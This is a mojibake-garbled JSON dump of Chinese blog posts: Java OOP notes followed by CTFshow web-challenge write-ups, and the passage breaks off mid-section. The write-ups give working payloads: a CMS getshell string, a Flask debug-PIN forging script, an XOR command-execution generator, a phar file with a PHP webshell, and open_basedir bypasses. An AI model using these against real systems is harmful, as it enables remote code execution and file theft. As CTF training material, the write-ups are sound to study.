}\n}\n```\n\n**ç»§æ‰¿**\n\n- ```\n  public class Son extends Father {}\n  ```\n\n- superå…³é”®å­—\n\n  - `super`å¯ä»¥ç”¨æ¥å¼•ç”¨ç›´æ¥çˆ¶ç±»çš„å®ä¾‹å˜é‡ã€‚\n  - `super`å¯ä»¥ç”¨æ¥è°ƒç”¨ç›´æ¥çˆ¶ç±»æ–¹æ³•ã€‚\n  - `super()`å¯ä»¥ç”¨äºè°ƒç”¨ç›´æ¥çˆ¶ç±»æ„é€ å‡½æ•°ã€‚\n\n- æ„é€ æ–¹æ³•ï¼šé»˜è®¤å…ˆæ‰§è¡Œçˆ¶ç±»æ— å‚æ„é€ ï¼Œå†æ‰§è¡Œè‡ªå·±æ„é€ \n\n**åŒ…**\n\n- åŒ…æ˜¯ç”¨æ¥åˆ†åˆ«ç®¡ç†å„ç§ä¸åŒçš„ç±»çš„ï¼Œç±»ä¼¼æ–‡ä»¶å¤¹ï¼Œå»ºåŒ…æœ‰åˆ©äºç¨‹åºçš„ç®¡ç†å’Œç»´æŠ¤\n- åŒ…åè¯­æ³•æ ¼å¼ï¼šåŸŸåå€’å†™.æŠ€æœ¯åç§°\n- å»ºåŒ…è¯­å¥å¿…é¡»åœ¨ç¬¬ä¸€è¡Œ\n- ç›¸åŒåŒ…ä¸‹çš„ç±»å¯ç›´æ¥è®¿é—®ï¼Œä¸åŒåŒ…ä¸‹ç±»å¿…é¡»å¯¼åŒ…ï¼Œ`import åŒ…å.ç±»å`\n- å¦‚æœè¯¥ç±»ä¸­ä½¿ç”¨ä¸åŒåŒ…ä¸‹ç›¸åŒçš„ç±»åï¼Œæ­¤æ—¶é»˜è®¤åªèƒ½å¯¼å…¥ä¸€ä¸ªç±»çš„åŒ…ï¼Œå¦ä¸€ä¸ªç±»çš„è¦ä½¿ç”¨å…¨åè®¿é—®\n\n**æƒé™ä¿®é¥°ç¬¦**\n\n- ç§æœ‰ï¼š`private`\n  - åªèƒ½åœ¨æœ¬ç±»ä¸­è®¿é—®\n- ç¼ºçœï¼šå•¥éƒ½ä¸åŠ \n  - åªèƒ½æœ¬ç±»ï¼Œæœ¬åŒ…ä¸‹è®¿é—®\n- ä¿æŠ¤ï¼š`protected`\n  - æœ¬ç±»ï¼ŒåŒåŒ…çš„å…¶ä»–ç±»ä¸­ï¼Œå…¶ä»–åŒ…çš„å­ç±»ä¸­\n- å…¬å…±ï¼š`public`\n  - è°éƒ½èƒ½è®¿é—®\n\n**finalå…³é”®å­—**\n\n- ä¿®é¥°ç±»ï¼šè¡¨æ˜æœ€ç»ˆç±»ï¼Œä¸å¯è¢«ç»§æ‰¿\n- ä¿®é¥°æ–¹æ³•ï¼šè¡¨æ˜æœ€ç»ˆæ–¹æ³•ï¼Œä¸å¯è¢«é‡å†™\n- ä¿®é¥°å˜é‡ï¼šè¡¨æ˜å˜é‡ç»è¿‡é¦–æ¬¡èµ‹å€¼åï¼Œä¸èƒ½å†æ¬¡è¢«èµ‹å€¼\n- å¸¸é‡å®šä¹‰ï¼š`public static final`\n\n**æšä¸¾**\n\n- ä½œç”¨ï¼šä¸ºäº†åšä¿¡æ¯çš„æ ‡å¿—å’Œä¿¡æ¯çš„åˆ†ç±»\n\n- ```java\n  ä¿®é¥°ç¬¦ enum æšä¸¾åç§°{\n  \tç¬¬ä¸€è¡Œéƒ½æ˜¯ç½—åˆ—æšä¸¾ç±»å®ä¾‹çš„åç§°\n  }\n  ```\n\n- æšä¸¾éƒ½ç»§æ‰¿è‡ªæšä¸¾ç±»å‹ï¼š`java.lang.Enum`\n\n- æšä¸¾ç±»éƒ½æ˜¯æœ€ç»ˆç±»\n\n- æ„é€ å™¨çš„æ„é€ å™¨éƒ½æ˜¯ç§æœ‰çš„ï¼Œæšä¸¾å¯¹å¤–ä¸èƒ½åˆ›å»ºå¯¹è±¡\n\n- æšä¸¾ç±»çš„ç¬¬ä¸€è¡Œé»˜è®¤éƒ½æ˜¯ç½—åˆ—æšä¸¾å¯¹è±¡çš„åç§°çš„\n\n- æšä¸¾ç±»ç›¸å½“äºæ˜¯å¤šä¾‹æ¨¡å¼\n\n- ```java\n  //æšä¸¾ç±»çš„ä½œç”¨å®ä¾‹ä»£ç \n  //ä¾‹å¦‚å¼€å‘æ¸¸æˆæ¥å—ç”¨æˆ·è¾“å…¥çš„å››ä¸ªæ–¹å‘çš„ä¿¡å·\n  //å¦‚æœé€‰æ‹©å¸¸é‡ï¼Œå…·æœ‰å¯è¯»æ€§ä½†æ˜¯å…¥å‚å€¼ä¸å—çº¦æŸ\n  //Orientation.java\n  public enum Orientation {\n      UP,DOWN,LEFT,RIGHT\n  }\n  //zhu.java\n  public class zhu {\n      public static void move(Orientation o){\n          switch (o){\n              case UP -> System.out.println(\"å¾€ä¸Šèµ°\");\n              case DOWN ->System.out.println(\"å¾€ä¸‹èµ°\");\n              case LEFT -> System.out.println(\"å¾€å·¦èµ°\");\n              case RIGHT -> System.out.println(\"å¾€å³èµ°\");\n          }\n      }\n      public static void main(String[] args) {\n          move(Orientation.RIGHT);\n      }\n  }\n  ```\n\n- ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202207061509169.png)\n\n**æŠ½è±¡**\n\n- abstractä¿®é¥°çš„ç±»å°±æ˜¯æŠ½è±¡ç±»ï¼Œä¿®é¥°çš„æ–¹æ³•å°±æ˜¯æŠ½è±¡æ–¹æ³•\n\n- å†™æŠ½è±¡æ–¹æ³•æ—¶ä¸èƒ½å†™æ–¹æ³•ä½“\n\n- å¦‚æœä¸€ä¸ªç±»ä¸­çš„æ–¹æ³•è¢«å£°æ˜æˆä¸ºæŠ½è±¡æ–¹æ³•ï¼Œé‚£ä¹ˆè¿™ä¸ªç±»å¿…é¡»è¢«å£°æ˜ä¸ºæŠ½è±¡ç±»\n\n- ```java\n  public abstract class animal {\n      public abstract void run();\n  }\n  ```\n\n- æŠ½è±¡ç±»å¯ä»¥ç†è§£ä¸ºä¸å®Œæ•´çš„è®¾è®¡å›¾ï¼Œä¸€èˆ¬åšçˆ¶ç±»\n\n- å½“çˆ¶ç±»çŸ¥é“å­ç±»éœ€è¦å®ŒæˆæŸäº›è¡Œä¸ºï¼Œè€Œå„ä¸ªå­ç±»å®ç°æ–¹æ³•åˆä¸åŒï¼Œå°±æŠŠè¯¥ç±»å®šä¹‰ä¸ºæŠ½è±¡æ–¹æ³•\n\n**æ¥å£**\n\n- ```java\n  //æ¥å£å®šä¹‰\n  public interface æ¥å£å{\n  \t\t//å¸¸é‡\n  \t\t//æŠ½è±¡æ–¹æ³•\n  }\n  ```\n\n- ```java\n  //æ¥å£å®ç°\n  class ç±»å implements æ¥å£1,æ¥å£2...{\n  \t\t//æŠ½è±¡æ–¹æ³•é‡å†™\n  }\n  ```\n\n- æ¥å£å¯ä»¥å¤šç»§æ‰¿ï¼Œä¸€ä¸ªæ¥å£å¯ä»¥ç»§æ‰¿å¤šä¸ªæ¥å£\n\n- æ¥å£ä¸èƒ½åˆ›å»ºå¯¹è±¡\n\n- ä¸€ä¸ªç±»å®ç°å¤šä¸ªæ¥å£ï¼Œå¤šä¸ªæ¥å£ä¸­æœ‰åŒæ ·çš„é™æ€æ–¹æ³•ä¸å†²çª\n\n- ä¸€ä¸ªç±»ç»§æ‰¿äº†çˆ¶ç±»åˆå®ç°äº†æ¥å£ï¼Œçˆ¶ç±»å’Œæ¥å£ä¸­çš„åŒåæ–¹æ³•ï¼Œé»˜è®¤ä½¿ç”¨çˆ¶ç±»çš„\n\n- ä¸€ä¸ªç±»å®ç°äº†å¤šä¸ªæ¥å£ï¼Œå¤šä¸ªæ¥å£ä¸­å­˜åœ¨åŒåçš„é»˜è®¤æ–¹æ³•ï¼Œä¸å†²çªï¼Œè¿™ä¸ªç±»é‡å†™è¯¥æ–¹æ³•å³å¯\n\n- ä¸€ä¸ªæ¥å£ç»§æ‰¿å¤šä¸ªæ¥å£æ˜¯æ²¡æœ‰é—®é¢˜çš„ï¼Œå¦‚æœå¤šä¸ªæ¥å£ä¸­å­˜åœ¨è§„èŒƒå†²çªåˆ™ä¸èƒ½ç»§æ‰¿\n\n- JDK8å¼€å§‹å¯¹æ¥å£åšçš„æ–°å¢æ–¹æ³•\n\n  - æ¥å£ä¸­å¯ä»¥æœ‰å¸¦æ–¹æ³•å®ç°çš„æ–¹æ³•\n  - é»˜è®¤æ–¹æ³•ï¼šç±»ä¼¼ä¹‹å‰çš„æ™®é€šæ–¹æ³•ï¼Œä½¿ç”¨defalutä¿®é¥°ï¼Œé»˜è®¤ç”¨publicä¿®é¥°ã€‚éœ€è¦ç”¨æ¥å£å®ç°ç±»çš„å¯¹è±¡æ¥è°ƒç”¨\n  - é™æ€æ–¹æ³•ï¼šä½¿ç”¨staticä¿®é¥°ï¼Œæ¥å£é™æ€æ–¹æ³•å¿…é¡»ç”¨æœ¬èº«çš„æ¥å£åæ¥è°ƒç”¨\n  - ç§æœ‰æ–¹æ³•ï¼šä½¿ç”¨privateä¿®é¥°ï¼Œåªèƒ½åœ¨æœ¬ç±»ï¼ˆæœ¬æ¥å£ï¼‰ä¸­è¢«å…¶ä»–çš„é»˜è®¤æ–¹æ³•æˆ–è€…ç§æœ‰æ–¹æ³•è®¿é—®\n"},{"title":"CTFshowCMS","url":"/posts/478f3262.html","content":"\n**477**\n\ncmseasy 5.7ï¼Œç™¾åº¦æœæœæ¼æ´ï¼Œæœ‰åå°getshell\n\né¦–å…ˆ/adminç™»å½•åå°ï¼Œadmin:adminç›´æ¥ç™»å½•ï¼Œåœ¨æ¨¡ç‰ˆâ€”è‡ªå®šä¹‰æ ‡ç­¾ä¸­å†™å…¥payload\n\n```\n1111111111111\";}<?php phpinfo();?>\n```\n\nç¯å¢ƒå˜é‡é‡Œé¢æ‰¾å§\n\n**478**\n\nphpcms 9.6.0\n\n**479**\n"},{"title":"CTFshowå¸¸ç”¨å§¿åŠ¿","url":"/posts/eaf7f5df.html","content":"\n**801**\n\n### flaskè®¡ç®—PIN\n\n**ä»€ä¹ˆæ˜¯PINç **\n\nPINç ä¹Ÿå°±æ˜¯flaskåœ¨å¼€å¯debugæ¨¡å¼ä¸‹ï¼Œè¿›è¡Œä»£ç è°ƒè¯•æ¨¡å¼çš„è¿›å…¥å¯†ç ï¼Œéœ€è¦æ­£ç¡®çš„PINç æ‰èƒ½è¿›å…¥è°ƒè¯•æ¨¡å¼\n\n**æ³¨æ„äº‹é¡¹ï¼šè°¨è®°ï¼ï¼python 3.8ï¼ˆmd5ï¼‰å’Œ3.6ï¼ˆsha1ï¼‰pinç ç”Ÿæˆæ–¹å¼ä¸åŒ**\n\n**ä½¿ç”¨æ¡ä»¶ï¼šflask debugæ¨¡å¼å¼€å¯ å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–**\n\né¦–å…ˆæ˜¯python PINç çš„ç”Ÿæˆè„šæœ¬\n\n```python\n#ç”Ÿæ•ˆæ—¶é—´ä¸ºä¸€å‘¨\nPIN_TIME = 60 * 60 * 24 * 7\n\n\ndef hash_pin(pin: str) -> str:\n    return hashlib.sha1(f\"{pin} added salt\".encode(\"utf-8\", \"replace\")).hexdigest()[:12]\n\n\n_machine_id: t.Optional[t.Union[str, bytes]] = None\n\n#è·å–æœºå™¨å·\ndef get_machine_id() -> t.Optional[t.Union[str, bytes]]:\n    global _machine_id\n\n    if _machine_id is not None:\n        return _machine_id\n\n    def _generate() -> t.Optional[t.Union[str, bytes]]:\n        linux = b\"\"\n\n        # machine-id is stable across boots, boot_id is not.\n        for filename in \"/etc/machine-id\", \"/proc/sys/kernel/random/boot_id\":\n            try:\n                with open(filename, \"rb\") as f:\n                    value = f.readline().strip()\n            except OSError:\n                continue\n\n            if value:\n            #è¯»å–æ–‡ä»¶è¿›è¡Œæ‹¼æ¥\n                linux += value\n                break\n\n        # Containers share the same machine id, add some cgroup\n        # information. This is used outside containers too but should be\n        # relatively stable across boots.\n        try:\n            with open(\"/proc/self/cgroup\", \"rb\") as f:\n            #ç»§ç»­è¿›è¡Œæ‹¼æ¥ï¼Œè¿™é‡Œå¤„ç†ä¸€ä¸‹åªè¦/dockeråçš„ä¸œè¥¿\n                linux += f.readline().strip().rpartition(b\"/\")[2]\n        except OSError:\n            pass\n\n        if linux:\n            return linux\n\n        # On OS X, use ioreg to get the computer's serial number.\n        try:\n            # subprocess may not be available, e.g. Google App Engine\n            # https://github.com/pallets/werkzeug/issues/925\n            from subprocess import Popen, PIPE\n\n            dump = Popen(\n                [\"ioreg\", \"-c\", \"IOPlatformExpertDevice\", \"-d\", \"2\"], stdout=PIPE\n            ).communicate()[0]\n            match = re.search(b'\"serial-number\" = <([^>]+)', dump)\n\n            if match is not None:\n                return match.group(1)\n        except (OSError, ImportError):\n            pass\n\n        # On Windows, use winreg to get the machine guid.\n        if sys.platform == \"win32\":\n            import winreg\n\n            try:\n                with winreg.OpenKey(\n                    winreg.HKEY_LOCAL_MACHINE,\n                    \"SOFTWARE\\\\Microsoft\\\\Cryptography\",\n                    0,\n                    winreg.KEY_READ | winreg.KEY_WOW64_64KEY,\n                ) as rk:\n                    guid: t.Union[str, bytes]\n                    guid_type: int\n                    guid, guid_type = winreg.QueryValueEx(rk, \"MachineGuid\")\n\n                    if guid_type == winreg.REG_SZ:\n                        return guid.encode(\"utf-8\")\n\n                    return guid\n            except OSError:\n                pass\n\n        return None\n\n    _machine_id = _generate()\n    return _machine_id\n\n\nclass _ConsoleFrame:\n    \"\"\"Helper class so that we can reuse the frame console code for the\n    standalone console.\n    \"\"\"\n\n    def __init__(self, namespace: t.Dict[str, t.Any]):\n        self.console = Console(namespace)\n        self.id = 0\n\n\ndef get_pin_and_cookie_name(\n    app: \"WSGIApplication\",\n) -> t.Union[t.Tuple[str, str], t.Tuple[None, None]]:\n    \"\"\"Given an application object this returns a semi-stable 9 digit pin\n    code and a random key.  The hope is that this is stable between\n    restarts to not make debugging particularly frustrating.  If the pin\n    was forcefully disabled this returns `None`.\n\n    Second item in the resulting tuple is the cookie name for remembering.\n    \"\"\"\n    pin = os.environ.get(\"WERKZEUG_DEBUG_PIN\")\n    rv = None\n    num = None\n\n    # Pin was explicitly disabled\n    if pin == \"off\":\n        return None, None\n\n    # Pin was provided explicitly\n    if pin is not None and pin.replace(\"-\", \"\").isdigit():\n        # If there are separators in the pin, return it directly\n        if \"-\" in pin:\n            rv = pin\n        else:\n            num = pin\n\n    modname = getattr(app, \"__module__\", t.cast(object, app).__class__.__module__)\n    username: t.Optional[str]\n\n    try:\n        # getuser imports the pwd module, which does not exist in Google\n        # App Engine. It may also raise a KeyError if the UID does not\n        # have a username, such as in Docker.\n        username = getpass.getuser()\n    except (ImportError, KeyError):\n        username = None\n\n    mod = sys.modules.get(modname)\n\n    # This information only exists to make the cookie unique on the\n    # computer, not as a security feature.\n    probably_public_bits = [\n        username,\n        modname,\n        getattr(app, \"__name__\", type(app).__name__),\n        getattr(mod, \"__file__\", None),\n    ]\n\n    # This information is here to make it harder for an attacker to\n    # guess the cookie name.  They are unlikely to be contained anywhere\n    # within the unauthenticated debug page.\n    private_bits = [str(uuid.getnode()), get_machine_id()]\n\n    h = hashlib.sha1()\n    for bit in chain(probably_public_bits, private_bits):\n        if not bit:\n            continue\n        if isinstance(bit, str):\n            bit = bit.encode(\"utf-8\")\n        h.update(bit)\n    h.update(b\"cookiesalt\")\n\n    cookie_name = f\"__wzd{h.hexdigest()[:20]}\"\n\n    # If we need to generate a pin we salt it a bit more so that we don't\n    # end up with the same value and generate out 9 digits\n    if num is None:\n        h.update(b\"pinsalt\")\n        num = f\"{int(h.hexdigest(), 16):09d}\"[:9]\n\n    # Format the pincode in groups of digits for easier remembering if\n    # we don't have a result yet.\n    if rv is None:\n        for group_size in 5, 4, 3:\n            if len(num) % group_size == 0:\n                rv = \"-\".join(\n                    num[x : x + group_size].rjust(group_size, \"0\")\n                    for x in range(0, len(num), group_size)\n                )\n                break\n        else:\n            rv = num\n\n    return rv, cookie_name\n```\n\nç”±ä¸Šå¯ä»¥çœ‹å¾—å‡ºPINå€¼ç”Ÿæˆæ‰€éœ€è¦è·å–çš„æ•°æ®æœ‰\n\n- usernameï¼Œç”¨æˆ·å\n- modnameï¼Œé»˜è®¤å€¼ä¸ºflask.app\n- appnameï¼Œé»˜è®¤å€¼ä¸ºFlask\n- moddirï¼Œflaskåº“ä¸‹app.pyçš„ç»å¯¹è·¯å¾„\n- uuidnodeï¼Œå½“å‰ç½‘ç»œçš„macåœ°å€çš„åè¿›åˆ¶æ•°\n- machine_idï¼Œdockeræœºå™¨idæˆ–æœ¬æœºid\n\né¦–å…ˆæ˜¯ç”¨æˆ·å\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206041655129.png)\n\nå¯ç”¨çš„ä¼¼ä¹åªæœ‰root\n\nä¸‹é¢ä¸‰é¡¹ä»»æ„æŠ¥é”™å³å¯è·å¾—\n\nmacåœ°å€\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206041659777.png)\n\nMachine_id\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206041701195.png)\n\næœ¬æœºç”Ÿæˆè„šæœ¬å¦‚ä¸‹\n\n```python\n#MD5\nimport hashlib\nfrom itertools import chain\nprobably_public_bits = [\n     'flaskweb'# username\n     'flask.app',# modname\n     'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))\n     '/usr/local/lib/python3.7/site-packages/flask/app.py' # getattr(mod, '__file__', None),\n]\n\nprivate_bits = [\n     '25214234362297',# str(uuid.getnode()),  /sys/class/net/ens33/address\n     '0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa'# get_machine_id(), /etc/machine-id\n]\n\nh = hashlib.md5()\nfor bit in chain(probably_public_bits, private_bits):\n    if not bit:\n        continue\n    if isinstance(bit, str):\n        bit = bit.encode('utf-8')\n    h.update(bit)\nh.update(b'cookiesalt')\n\ncookie_name = '__wzd' + h.hexdigest()[:20]\n\nnum = None\nif num is None:\n   h.update(b'pinsalt')\n   num = ('%09d' % int(h.hexdigest(), 16))[:9]\n\nrv =None\nif rv is None:\n   for group_size in 5, 4, 3:\n       if len(num) % group_size == 0:\n          rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')\n                      for x in range(0, len(num), group_size))\n          break\n       else:\n          rv = num\n\nprint(rv)\n```\n\n```python\n#sha1\nimport hashlib\nfrom itertools import chain\nprobably_public_bits = [\n    'root'# /etc/passwd\n    'flask.app',# é»˜è®¤å€¼\n    'Flask',# é»˜è®¤å€¼\n    '/usr/local/lib/python3.8/site-packages/flask/app.py' # æŠ¥é”™å¾—åˆ°\n]\n\nprivate_bits = [\n    '2485377581187',#  /sys/class/net/eth0/address 16è¿›åˆ¶è½¬10è¿›åˆ¶\n    #machine_idç”±ä¸‰ä¸ªåˆå¹¶(dockerå°±åä¸¤ä¸ª)ï¼š1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup\n    '653dc458-4634-42b1-9a7a-b22a082e1fce55d22089f5fa429839d25dcea4675fb930c111da3bb774a6ab7349428589aefd'#  /proc/self/cgroup\n]\n\nh = hashlib.sha1()\nfor bit in chain(probably_public_bits, private_bits):\n    if not bit:\n        continue\n    if isinstance(bit, str):\n        bit = bit.encode('utf-8')\n    h.update(bit)\nh.update(b'cookiesalt')\n\ncookie_name = '__wzd' + h.hexdigest()[:20]\n\nnum = None\nif num is None:\n    h.update(b'pinsalt')\n    num = ('%09d' % int(h.hexdigest(), 16))[:9]\n\nrv =None\nif rv is None:\n    for group_size in 5, 4, 3:\n        if len(num) % group_size == 0:\n            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')\n                          for x in range(0, len(num), group_size))\n            break\n    else:\n        rv = num\n\nprint(rv)\n```\n\nä½¿ç”¨æœ€ç»ˆç”Ÿæˆçš„PINè¿›å…¥ä»£ç è°ƒè¯•ï¼ŒRCE\n\n**802**\n\n### æ— å­—æ¯æ•°å­—å‘½ä»¤æ‰§è¡Œ\n\nå¼‚æˆ–æ³•ï¼Œå·ä¸ªè„šæœ¬å–µå–µ\n\n```php\n<?php\n\n/*author yu22x*/\n\n$myfile = fopen(\"xor_rce.txt\", \"w\");\n$contents=\"\";\nfor ($i=0; $i < 256; $i++) {\n    for ($j=0; $j <256 ; $j++) {\n\n        if($i<16){\n            $hex_i='0'.dechex($i);\n        }\n        else{\n            $hex_i=dechex($i);\n        }\n        if($j<16){\n            $hex_j='0'.dechex($j);\n        }\n        else{\n            $hex_j=dechex($j);\n        }\n        $preg = '/[a-z0-9]/i'; //æ ¹æ®é¢˜ç›®ç»™çš„æ­£åˆ™è¡¨è¾¾å¼ä¿®æ”¹å³å¯\n        if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){\n            echo \"\";\n        }\n\n        else{\n            $a='%'.$hex_i;\n            $b='%'.$hex_j;\n            $c=(urldecode($a)^urldecode($b));\n            if (ord($c)>=32&ord($c)<=126) {\n                $contents=$contents.$c.\" \".$a.\" \".$b.\"\\n\";\n            }\n        }\n\n    }\n}\nfwrite($myfile,$contents);\nfclose($myfile);\n\n```\n\n```python\n# -*- coding: utf-8 -*-\n\n# author yu22x\n\nimport requests\nimport urllib\nfrom sys import *\nimport os\ndef action(arg):\n   s1=\"\"\n   s2=\"\"\n   for i in arg:\n       f=open(\"xor_rce.txt\",\"r\")\n       while True:\n           t=f.readline()\n           if t==\"\":\n               break\n           if t[0]==i:\n               #print(i)\n               s1+=t[2:5]\n               s2+=t[6:9]\n               break\n       f.close()\n   output=\"(\\\"\"+s1+\"\\\"^\\\"\"+s2+\"\\\")\"\n   return(output)\n   \nwhile True:\n   param=action(input(\"\\n[+] your functionï¼š\") )+action(input(\"[+] your commandï¼š\"))+\";\"\n   print(param)\n```\n\n**803**\n\n### pharæ–‡ä»¶åŒ…å«\n\næ¥è‡ªå¤§ä½¬çš„æç¤ºï¼šæŠŠpharå½“å‹ç¼©åŒ…ç”¨å°±è¡Œ\n\né¦–å…ˆç”ŸæˆåŒ…å«ä¸€å¥è¯æœ¨é©¬çš„pharæ–‡ä»¶\n\n```php\n<?php\n$phar = new Phar(\"phar.phar\"); //åç¼€åå¿…é¡»ä¸ºphar\n$phar->startBuffering();\n$phar->setStub('<?php __HALT_COMPILER(); ?>'); //è®¾ç½®stub\n$phar->addFromString('test.txt', '<?php system($_POST[a]);?>'); //\n$phar->stopBuffering();\n// pharç”Ÿæˆ\n?>\n```\n\næ­¤æ—¶pharåŒ…ä¸­çš„test.txtä¸­çš„å†…å®¹å°±æ˜¯æˆ‘ä»¬çš„ä¸€å¥è¯æœ¨é©¬äº†\n\nä¸Šä¼ æ–‡ä»¶ï¼ˆè®°å¾—è¯»å–ç„¶åurlç¼–ç ä¸€ä¸‹ï¼‰\n\n```\npayload:?file=/tmp/phar.phar&content=%3C%3Fphp+__HALT_COMPILER%28%29%3B+%3F%3E%0D%0A6%00%00%00%01%00%00%00%11%00%00%00%01%00%00%00%00%00%00%00%00%00%08%00%00%00test.txt%1A%00%00%00%7E%E7%9Db%1A%00%00%00%C8%C2%DA%2C%A4%01%00%00%00%00%00%00%3C%3Fphp+system%28%24_POST%5Ba%5D%29%3B%3F%3E%FB%C1%FC%A84J%19%C8f%97%29%BA%C7%80v%82%F5%86J%06%02%00%00%00GBMB\n```\n\nincludeå¹²\n\n![æˆªå±2022-06-06 20.00.48](/Users/jlan/Library/Application Support/typora-user-images/æˆªå±2022-06-06 20.00.48.png)\n\n**804**\n\n### pharååºåˆ—åŒ–\n\nè¿™ä¸ç”¨æ•™å§\n\n```php\n<?php\nclass hacker{\n    public $code;\n}\n\n// @unlink(\"phar.phar\");\n$phar = new Phar(\"phar.phar\"); //åç¼€åå¿…é¡»ä¸ºphar\n// $phar = $phar->convertToExecutable(Phar::TAR, Phar::GZ); //å‹ç¼©è§„é¿æ•æ„Ÿå­—ç¬¦\n$phar->startBuffering();\n$phar->setStub(\"GIF89a\".\"<?php __HALT_COMPILER(); ?>\"); //è®¾ç½®stub\n$o = new hacker();\n$o->code=\"highlight_file('flag.php');\";\n$phar->setMetadata($o); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest\n$phar->addFromString(\"test.txt\", \"test\"); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶\n//ç­¾åè‡ªåŠ¨è®¡ç®—\n$phar->stopBuffering();\n// pharç”Ÿæˆ\n\n?>\n```\n\nä¸Šä¼ pharåè®®è¯»å–å°±è¡Œ\n\n**805**\n\n### open_basedirç»•è¿‡\n\n> open_basediræ˜¯php.iniä¸­çš„ä¸€ä¸ªé…ç½®é€‰é¡¹ï¼Œå¯ç”¨äºå°†ç”¨æˆ·è®¿é—®æ–‡ä»¶çš„æ´»åŠ¨èŒƒå›´é™åˆ¶åœ¨æŒ‡å®šçš„åŒºåŸŸã€‚\n>\n> å‡è®¾open_basedir=/var/www/html/web1/:/tmp/ï¼Œé‚£ä¹ˆé€šè¿‡web1è®¿é—®æœåŠ¡å™¨çš„ç”¨æˆ·å°±æ— æ³•è·å–æœåŠ¡å™¨ä¸Šé™¤äº†/var/www/html/web1/å’Œ/tmp/è¿™ä¸¤ä¸ªç›®å½•ä»¥å¤–çš„æ–‡ä»¶ã€‚\n>\n> æ³¨æ„ï¼šç”¨open_basediræŒ‡å®šçš„**é™åˆ¶å®é™…ä¸Šæ˜¯å‰ç¼€ï¼Œè€Œä¸æ˜¯ç›®å½•å**ã€‚\n>\n> æ–‡ç« æ¥è‡ª[è¿™é‡Œ](https://www.cnblogs.com/hookjoy/p/12846164.html)\n\nä½†æ˜¯è¿™ä¸ªé…ç½®å¯¹ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œæ˜¯æ²¡æœ‰æ•ˆæœçš„ï¼Œæ¯”å¦‚æ‰§è¡Œ`system('ls /')`çš„æ—¶å€™å°±ä¸å—é™åˆ¶ï¼Œ~~ä½†æ˜¯ä¸€èˆ¬éƒ½ä¼šè¢«banæ‰~~\n\nä¸‹é¢å°±æ˜¯ä¸€äº›bypassæ–¹æ³•\n\n1. globåè®®ï¼Œåªèƒ½æææ–‡ä»¶å\n\n   ```php\n     $a = \"glob:///*\";\n     if ( $b = opendir($a) ) {\n       while ( ($file = readdir($b)) !== false ) {\n         echo $file.\"\\n\";\n       }\n       closedir($b);\n     }\n   ```\n\n2. åˆ©ç”¨chdir()ä¸ini_set()ç»„åˆBypass\n\n   åŸç†åœ¨è¿™é‡Œ\n\n   ```php\n   mkdir(\"s\");\n   chdir('s');\n   ini_set('open_basedir','..');\n   chdir('..');\n   chdir('..');\n   chdir('..');\n   chdir('..');\n   ini_set('open_basedir','/');\n   echo file_get_contents(\"/ctfshowflag\");\n   ```\n\n3. åˆ©ç”¨bindtextdomain()å‡½æ•°Bypass\n\n   è¿™ä¸ªæ–¹æ³•ä¹Ÿåªèƒ½æææ–‡ä»¶å\n\n   > **bindtextdomain()å‡½æ•°**\n   >\n   > (PHP 4, PHP 5, PHP 7)\n   >\n   > bindtextdomain()å‡½æ•°ç”¨äºç»‘å®šdomainåˆ°æŸä¸ªç›®å½•çš„å‡½æ•°ã€‚\n   >\n   > ```php\n   > bindtextdomain ( string $domain , string $directory ) : string\n   > ```\n   >\n   > bindtextdomain()å‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°\\$directoryæ˜¯ä¸€ä¸ªæ–‡ä»¶è·¯å¾„ï¼Œå®ƒä¼šåœ¨\\$directoryå­˜åœ¨çš„æ—¶å€™è¿”å›\\$directoryï¼Œä¸å­˜åœ¨åˆ™è¿”å›falseã€‚\n\n   æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ä¿®æ”¹directoryå‚æ•°æ ¹æ®è¿”å›å€¼æ¥åˆ¤æ–­æ–‡ä»¶æ˜¯å¦å­˜åœ¨\n\n4. åˆ©ç”¨SplFileInfo::getRealPath()ç±»æ–¹æ³•Bypass\n\n   è¿™ä¸ªå’Œä¸Šé¢é‚£ä¸ªå¾ˆç›¸ä¼¼ï¼Œä¹Ÿæ˜¯åŸºäºæŠ¥é”™ï¼Œç›´æ¥ç»™payloadå§\n\n   ```php\n   <?php\n   echo '<b>open_basedir: ' . ini_get('open_basedir') . '</b><br />';\n   $info = new SplFileInfo($_GET['dir']);\n   var_dump($info->getRealPath());\n   ?>\n   ```\n\n5. åˆ©ç”¨realpath()å‡½æ•°Bypass\n\n   > ### realpath()å‡½æ•°\n   >\n   > (PHP 4, PHP 5, PHP 7)\n   >\n   > realpath â€” è¿”å›è§„èŒƒåŒ–çš„ç»å¯¹è·¯å¾„åã€‚å®ƒå¯ä»¥å»æ‰å¤šä½™çš„../æˆ–./ç­‰è·³è½¬å­—ç¬¦ï¼Œèƒ½å°†ç›¸å¯¹è·¯å¾„è½¬æ¢æˆç»å¯¹è·¯å¾„ã€‚\n   >\n   > å‡½æ•°å®šä¹‰å¦‚ä¸‹ï¼š\n   >\n   > ```php\n   > realpath ( string $path ) : string\n   > ```\n   >\n   > ### Bypass\n   >\n   > ç¯å¢ƒæ¡ä»¶ï¼šWindows\n   >\n   > 